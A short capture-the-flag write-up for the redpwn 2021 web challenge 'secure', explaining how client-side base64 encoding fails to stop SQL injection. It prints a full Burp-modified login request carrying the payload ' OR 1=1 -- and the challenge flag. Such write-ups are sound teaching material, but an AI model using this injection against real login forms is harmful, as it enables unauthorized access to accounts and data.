# redpwn2021

# secure  
**Category:** web  
**Description:**  
Just learned about encryption—now, my website is unhackable!

secure.mc.ax

# solution  
This problem is a simple sql injection.  When looking at the javascript, you
can find that the input is 'sanitized' client side via base 64 encoding,
thereby preventing any direct sql injection through the input boxes.  However,
this can be very easily bypassed by using burp suite.  Burp allows you to
directly modify the packet sent, so you can change the base64 encoded password
in the request sent to the sql injection to bypass b64 encoding and get the
flag.

  

```  
My Example Burp Request:  
POST /login HTTP/1.1  
Host: secure.mc.ax  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101
Firefox/83.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 53  
Origin: https://secure.mc.ax  
Connection: close  
Referer:
https://secure.mc.ax/?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D  
Upgrade-Insecure-Requests: 1

username=YWRtaW4%3D&password=' OR 1=1 --  
```  
  
  
YWRtaW4%3D is base64 & url encoded 'admin'  

Original writeup
(https://github.com/Teddygat0r/redpwn2021/blob/main/README.md).